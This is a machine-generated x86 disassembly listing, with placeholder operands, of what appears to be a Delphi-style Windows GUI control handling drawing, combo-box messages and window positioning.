push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44f914
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_424990
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b4
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041ac
push eax
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
mov eax [ ebx + 0x160 ]
call sub_424a70
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423a44
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041ac
push eax
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
mov eax [ ebx + 0x160 ]
call sub_424a70
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_423a44
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041ac
push eax
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
mov eax [ ebx + 0x160 ]
call sub_424a70
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444269
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_444273
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_44449c
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_42432c
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_424210
xor edx edx
mov eax [ esi + 0x14 ]
call sub_42432c
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_4245fc
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403370
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403370
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_444394
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_424af0
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403370
xor edx edx
mov eax [ edi + 0x160 ]
call sub_424af0
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403370
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_44a414
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_4444d8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44449c
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444538
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403370
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444560
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44cb04
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_4445c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_444651
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444658
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d634
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_464d50
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403370
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_4446c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44472a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444731
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419918
sub_44473c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_444760
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_404538
mov edx esi
xchg edx eax
call sub_404538
mov eax [ esi ]
call sub_4043ac
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4447b8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44481c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_44d634
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_44d664
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444823
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_444828
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_444848
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043ac
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_444870
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_44db70
sub_4448a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_444917
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4043ac
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44491e
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
sub_444928
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44499b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_4043ac
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4449a2
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
sub_4449a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44fb48
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_44cdf0
mov edx 0x19
mov eax ebx
call sub_44ce14
mov dl 0x1
mov eax ebx
call sub_454050
xor edx edx
mov eax ebx
call sub_44d7f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44c210
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_444d4c
call sub_421a58
mov [ ebx + 0x24c ] eax
push ebx
push sub_444e44
call sub_421a58
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_444a9c
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_454120
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_464c4c
mov eax [ esi + 0x24c ]
call sub_464c4c
mov eax [ esi + 0x208 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44fc6c
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_444b1e
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_451210
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_444b68
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_444b8c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_453e1c
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_453e1c
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_444bd4
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_444c00
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_444c3c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_454120
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_444c8c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_453e1c
push eax
call SetWindowTextA
sub_444cc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_444b68
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_444d00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_453434
pop esi
pop ebx
retn
mov eax ebx
call sub_4513bc
sub_444d24
push ebx
mov ebx eax
mov eax ebx
call sub_44f20c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444d4c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_464dc0
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_44d178
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406ab0
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44dcdc
jmp r-xdata
sub_444e78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44512f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452c70
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452d58
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444b68
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46e664
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403370
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_464dc0
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4439f4
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452e20
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_444b68
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_444b8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_445154
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_44dda4
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_451830
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_452e20
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423584
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_424208
call sub_423584
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_424244
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45179c
test al al
jne r-xdata
mov eax ebx
call sub_444b68
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_444b8c
jmp r-xdata
sub_445262
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4453c0
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4453c7
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
jmp [ eax * 4 + jump_table_445290 ]
mov eax edi
mov si 0xffe9
call sub_403370
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_403370
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_403370
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44d664
mov eax edi
mov si 0xffeb
call sub_403370
mov eax edi
mov si 0xffb2
call sub_403370
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_403370
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_4525a0
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_45268c
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_453e1c
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_453e1c
push eax
call PostMessageA
jmp r-xdata
sub_4453f4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44549d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_44c228
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_4245fc
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4454a4
lea eax [ ebp - 0x14 ]
call sub_403eec
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_424800
sub_4454d0
push esi
push edi
mov esi eax
mov eax esi
call sub_44f6f0
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_4454f8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_454120
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_44554c
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_403370
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_445578
push ebx
mov ebx eax
mov eax ebx
call sub_450dd4
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_4455b0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_445646
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44564d
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_44564d
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_44566c
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_44569c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
